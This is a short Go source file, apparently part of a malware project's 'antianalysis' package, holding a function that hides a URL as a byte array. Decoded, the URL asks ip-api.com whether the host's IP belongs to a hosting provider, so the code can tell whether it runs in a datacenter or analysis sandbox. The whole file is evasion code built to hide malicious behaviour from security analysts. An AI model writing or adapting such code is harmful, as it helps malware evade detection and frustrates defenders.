package antianalysis

import (
	"io"
	"net/http"
)

func HostingCheck() bool {
	resp, err := http.Get(string([]byte{104, 116, 116, 112, 58, 47, 47, 105, 112, 45, 97, 112, 105, 46, 99, 111, 109, 47, 108, 105, 110, 101, 47, 63, 102, 105, 101, 108, 100, 115, 61, 104, 111, 115, 116, 105, 110, 103}))
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false
	}

	response := string(body)
	if response == "true" {
		return true
	} else {
		return false
	}
}
